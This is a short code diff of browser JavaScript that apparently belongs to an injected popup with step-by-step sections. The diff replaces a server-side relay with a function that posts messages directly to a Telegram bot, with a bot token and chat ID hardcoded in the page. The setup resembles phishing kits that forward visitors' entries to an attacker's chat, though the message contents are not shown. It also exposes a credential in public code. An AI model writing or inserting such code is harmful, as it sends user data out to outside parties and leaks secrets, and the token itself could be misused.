@@ -220,14 +220,20 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-  function sendToTelegram(message) {
-  fetch('/api/sendToTelegram', {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ message })
-  });
-}
+   const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
+  const TELEGRAM_CHAT_ID = '-4704812522';
 
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+  }
   // Section switching logic
   function nextSection(showId) {
     popup.querySelectorAll('.section, .loader-section').forEach(sec => sec.classList.remove('active'));
